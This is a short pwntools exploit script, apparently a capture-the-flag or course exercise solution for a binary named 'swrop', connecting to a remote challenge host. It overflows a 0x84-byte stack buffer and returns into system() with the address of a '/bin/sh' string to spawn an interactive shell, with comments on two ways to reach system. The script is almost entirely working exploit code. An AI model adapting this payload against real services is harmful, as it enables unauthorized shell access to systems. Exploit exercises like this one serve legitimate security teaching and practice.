from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
read(0, ebp-0x84, 0x100)
"""

p = process("./swrop")
p = remote("plsdonthaq.me", 6001)

string_binsh = 0x80485f0
# func_system = 0x8048390

payload = b""
payload += b'\x90' * (0x84 + 4) # Write up to esp

'''
Use the `call system` instruction
this method does not need an extra 4 byte padding
'''
# payload += p32(func_no_call_system)

'''
Jump into the system function
this method needs an extra 4 byte padding
'''
payload += p32(0x8048390)
payload += b'....'

payload += p32(string_binsh)

p.sendline(payload)
p.interactive()
